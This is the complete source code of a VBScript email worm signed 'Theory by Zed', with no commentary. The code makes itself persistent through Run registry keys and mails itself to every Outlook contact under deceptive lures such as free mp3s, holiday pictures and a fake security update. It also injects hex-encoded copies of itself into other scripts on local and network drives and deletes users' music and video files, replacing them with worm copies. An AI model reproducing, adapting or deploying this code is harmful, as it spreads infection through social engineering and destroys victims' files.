' Theory by Zed
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
Randomize
Set RndFolder = fso.GetSpecialFolder(Int(3 * Rnd))
Set G = fso.GetFile(WScript.ScriptFullName)
Set SysDir = fso.GetSpecialFolder(1)
Randomize
Randomize
For RC = 1 To Int((Rnd * 11 + 1))
R1 = R1 & Chr(Int(Rnd * 26 + 97))
Next
If LCase(SysDir) = "c:\windows\system" Then
WormFullName = (fso.GetSpecialFolder(1) & "\Runmsdsk32.vbs")
WormRegistryKey = ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Runmsdsk32")
WormRegistryValue = ("Wscript.exe " & WormFullName & " %1")
WormFName = "Runmsdsk32.vbs"
G.Copy (WormFullName)
wsc.RegWrite WormRegistryKey, WormRegistryValue
G.Copy (fso.GetSpecialFolder(1) & "\SiteList.vbs")
OS = Win9x
ElseIf LCase(SysDir) = "c:\winnt\system32" Then
WormFullName = (fso.GetSpecialFolder(0) & "\Winnt32.vbs")
WormRegistryKey = ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Winnt32")
WormRegistryValue = ("Wscript.exe " & WormFullName & " %1")
WormFName = "Winnt32.vbs"
G.Copy (WormFullName)
wsc.RegWrite WormRegistryKey, WormRegistryValue
G.Copy (fso.GetSpecialFolder(1) & "\Jokes.vbs")
OS = WinNT
ElseIf LCase(SysDir) = "c:\windows\system32" Then
WormFullName = (RndFolder & "\" & R1 & ".vbs")
WormRegistryKey = ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Runxpdsk32")
WormRegistryValue = ("Wscript.exe " & WormFullName & " %1")
WormFName = R1 & ".vbs"
G.Copy (WormFullName)
wsc.RegWrite WormRegistryKey, WormRegistryValue
G.Copy (fso.GetSpecialFolder(1) & "\Confidential.vbs")
OS = WinXP
Else
WormFullName = (RndFolder & "\Runmnt32.vbs")
WormRegistryKey = ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Runmnt32")
WormRegistryValue = ("Wscript.exe " & WormFullName & " %1")
WormFName = "Runmnt32.vbs"
G.Copy (WormFullName)
wsc.RegWrite WormRegistryKey, WormRegistryValue
G.Copy (fso.GetSpecialFolder(1) & "\HolidayPics.vbs")
End If
wsc.RegWrite "HKEY_CURRENT_USER\Software\Theory\Theory", "VBS/Theory by Zed"
UserName = wsc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
If UserName <> "" Then UserName = PCOwner
Set OutlookApp = CreateObject("Outlook.Application")
Set GNS = OutlookApp.GetNameSpace("MAPI")
For List1 = 1 To GNS.AddressLists.Count
CountLoop = 1
For ListCount = 1 To GNS.AddressLists(List1).AddressEntries.Count
Set OutlookEmail = OutlookApp.CreateItem(0)
WriteEmailSent = wsc.RegRead("HKEY_CURRENT_USER\Software\Theory\Theory\RecordContacts\" & GNS.AddressLists(List1).AddressEntries(CountLoop))
If WriteEmailSent = "" Then
OutlookEmail.Recipients.Add (GNS.AddressLists(List1).AddressEntries(CountLoop))
If OS = Win9x Then
EmlSubject = "Hey " & GNS.AddressLists(List1).AddressEntries(CountLoop) & "!"
EmlText = GNS.AddressLists(List1).AddressEntries(CountLoop) & "! Get free mp3s from the web site that i go to!" & vbCrLf _
& "I can get almost any music that I want, just look at all the cool sites that I went to in the attachments." & vbCrLf _
& vbCrLf & "Bye"
EmlAttachment = fso.GetSpecialFolder(1) & "\SiteList.vbs"
Else
If OS = WinNT Then
EmlSubject = "Hello " & GNS.AddressLists(List1).AddressEntries(CountLoop) & "!"
EmlText = "Have fun with these great jokes!" & vbCrLf & vbCrLf & PCOwner
EmlAttachment = fso.GetSpecialFolder(1) & "\Jokes.vbs"
Else
If OS = WinXP Then
EmlSubject = "Here is that file you wanted, " & GNS.AddressLists(List1).AddressEntries(CountLoop) & "."
EmlText = "This is the file you wanted - don't let anyone else see it!" & vbCrLf & vbCrLf & PCOwner
EmlAttachment = fso.GetSpecialFolder(1) & "\Confidential.vbs"
Else
EmlSubject = "Check this out, " & GNS.AddressLists(List1).AddressEntries(CountLoop) & "!"
EmlText = "Hello " & GNS.AddressLists(List1).AddressEntries(CountLoop) & "," & vbCrLf _
& vbCrLf & "check out these pictures of my last holiday!" & vbCrLf & vbCrLf & "Dont get jealous!" & vbCrLf & vbCrLf & PCOwner
EmlAttachment = fso.GetSpecialFolder(1) & "\HolidayPics.vbs"
End If
End If
End If
If Day(Now) = 8 And Month(Now) = 8 Then
Randomize
Select Case Int((6 * Rnd) + 1)
Case 1: RndAttachment = "SecurityUpdate.vbs"
Case 2: RndAttachment = "Update.vbs"
Case 3: RndAttachment = "UpdateSecurity.vbs"
Case 4: RndAttachment = "UpdateInstaller.vbs"
Case 5: RndAttachment = "UpdateSetup.vbs"
Case 6: RndAttachment = "Readme.vbs"
End Select
G.Copy (fso.GetSpecialFolder(1) & "\" & RndAttachment)
EmlSubject = "Urgent Update!"
EmlText = GNS.AddressLists(List1).AddressEntries(CountLoop) & "," & vbCrLf _
& vbCrLf & "Your computer will need this update to protect your computer from new email" & vbCrLf _
& "viruses. I installed this update and it works fine." & vbCrLf & vbCrLf & "Thanks."
EmlAttachment = fso.GetSpecialFolder(1) & "\" & RndAttachment
End If
OutlookEmail.Subject = EmlSubject
OutlookEmail.Body = EmlText
OutlookEmail.Attachments.Add (EmlAttachment)
OutlookEmail.DeleteAfterSubmit = True
OutlookEmail.Send
wsc.RegWrite "HKEY_CURRENT_USER\Software\Theory\Theory\RecordContacts\" & GNS.AddressLists(List1).AddressEntries(CountLoop), GNS.AddressLists(List1).AddressEntries(CountLoop)
Else
End If
CountLoop = CountLoop + 1
Next
Next
Set OutlookApp = Nothing
Set GNS = Nothing
Set JC = fso.OpenTextFile(WScript.ScriptFullName, 1)
WormFileReadAllText = JC.ReadAll
JC.Close
E1()
Sub E1()
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
For Each SeekNetCopyDrives In a.Drives
If SeekNetCopyDrives.DriveType = 2 _
Or SeekNetCopyDrives.DriveType = 3 Then
E3 (SeekNetCopyDrives.Path & "\")
End If
Next
End Sub
Sub E2(FileTarget)
On Error Resume Next
Set otf = a.GetFile(WScript.ScriptFullName)
ra = otf.ReadAll
otf.Close
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.Files
If (LCase(a.GetExtensionName(n.Path))) = "vbs" Or (LCase(a.GetExtensionName(n.Path))) = "vbe" Then
Set openvbs = a.OpenTextFile(n.Path, 1)
vbsra = openvbs.ReadAll
openvbs.Close
If (InStr(1, vbsra, "' Theory by Zed") = False) Then
Set fso = CreateObject("Scripting.FileSystemObject")
Set JC = fso.OpenTextFile(WScript.ScriptFullName, 1)
WormFileReadAllText = JC.ReadAll
JC.Close
Set WriteWormCode = fso.OpenTextFile(n.Path, 8, True)
WriteWormCode.WriteLine vbCrLf & "' Theory by Zed" & vbCrLf & "Tz = " & Chr(34) & Chr(34)
For i = 1 To Len(WormFileReadAllText)
Tz = Mid(WormFileReadAllText, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = "0" & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
If Len(WormFileReadAllText) - i = 0 Then
WriteWormCode.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = ""
End If
Next
WriteWormCode.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
WriteWormCode.WriteLine "Set wsc = CreateObject(""WScript.Shell"")"
WriteWormCode.WriteLine "MC = CM(Tz)"
WriteWormCode.WriteLine "Set WriteTheory = fso.CreateTextFile(fso.GetSpecialFolder(1) & ""\Rundskcp32.vbs"", True)"
WriteWormCode.WriteLine "WriteTheory.Write MC"
WriteWormCode.WriteLine "WriteTheory.Close"
WriteWormCode.WriteLine "wsc.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSTheory"", ""Wscript.exe "" & fso.GetSpecialFolder(1) & ""\Rundskcp32.vbs %1"""
WriteWormCode.WriteLine "Function CM(CN)"
WriteWormCode.WriteLine "For GC = 1 To Len(CN) Step 2"
WriteWormCode.WriteLine "CM = CM & Chr(""&h"" & Mid(CN, GC, 2))"
WriteWormCode.WriteLine "Next"
WriteWormCode.WriteLine "End Function"
WriteWormCode.Close
End If
End If
MusicExt = (LCase(a.GetExtensionName(n.Path)))
If MusicExt = "mp3" Or MusicExt = "mp2" Or MusicExt = "mp3" _
Or MusicExt = "mpg" Or MusicExt = "mpe" _
Or MusicExt = "mpeg" Or MusicExt = "avi" Or MusicExt = "mov" Then
G.Copy (n.Path & ".vbs")
Set OriginalFile = a.GetFile(n.Path)
OriginalFile.Delete
End If
Next
End Sub
Sub E3(FileTarget)
On Error Resume Next
Set a = CreateObject("Scripting.FileSystemObject")
Set f = a.GetFolder(FileTarget)
For Each n In f.SubFolders
E2 (n.Path)
E3 (n.Path)
Next
End Sub
Do
If Not fso.FileExists(WormFullName) Then
fso.CopyFile WScript.ScriptFullName, WormFullName
End If
ReadRegistry = wsc.RegRead(WormRegistryKey)
If Not ReadRegistry = WormRegistryValue Then
wsc.RegWrite WormRegistryKey, WormRegistryValue
End If
Loop
' Theory by Zed